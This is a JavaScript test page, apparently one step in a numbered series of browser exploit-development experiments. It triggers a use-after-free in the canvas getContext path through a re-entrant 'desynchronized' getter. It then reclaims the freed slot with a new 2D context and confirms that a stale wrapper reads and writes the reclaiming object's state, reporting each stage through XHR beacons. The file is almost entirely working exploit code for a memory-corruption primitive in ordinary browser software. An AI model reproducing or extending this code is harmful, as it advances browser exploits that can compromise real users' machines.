// p492 — control experiment: same-type reclaim + state-read via stale wrapper.
//
// Isolates ONE variable vs p491's death-before-discriminator: reclaim the slot
// with a fresh 2D context (the R2-proven 4/4 path) instead of touching it bare.
//   CTL1 fires with a number  -> slot readable through stale wrapper after
//                                same-type reclaim; timing model holds; p491's
//                                early death = bare freed slot unreadable.
//   death before CTL1         -> even the proven path dies today -> engine
//                                allocations intervene before JS resumes.
// CTL2 = getLineDash via same state machinery. CTL3 = write-through alias check.
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','TRIG','CTL1','CTL2','CTL3','DONE','HTMLERR'].forEach(function(n){
    var x = new XMLHttpRequest();
    x.open('POST', BASE + '/beacon/V492-' + n);
    staged.push([n, x]);
  });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now()-T0) + 'ms] ' + (body||'')); return; }
    } catch(e) {}
  }
  S('BOOT', navigator.userAgent);

  var tc = document.createElement('canvas');
  var nc = document.createElement('canvas');   // pre-allocated BEFORE the trigger
  var inner = null;

  // R2-proven trigger variant (2d + desynchronized getter)
  var outer = tc.getContext('2d', {
    get desynchronized() { inner = tc.getContext('2d'); return false; }
  });
  // FIRST allocation after return: same-type reclaim
  var c2 = nc.getContext('2d');
  S('TRIG', 'inner=' + (!!inner) + ' outer=' + (!!outer) + ' c2=' + (!!c2));

  // state-read through the stale wrapper (expect 1, the default lineWidth)
  S('CTL1', 'lineWidth=' + inner.lineWidth);

  // second state getter (expect empty array)
  S('CTL2', 'dash=' + JSON.stringify(inner.getLineDash()).substring(0, 40));

  // write-through alias: write via the reclaiming wrapper, read via stale one
  c2.lineWidth = 13.37;
  S('CTL3', 'alias=' + (inner.lineWidth === 13.37));
  S('DONE', 'control-complete');
})();
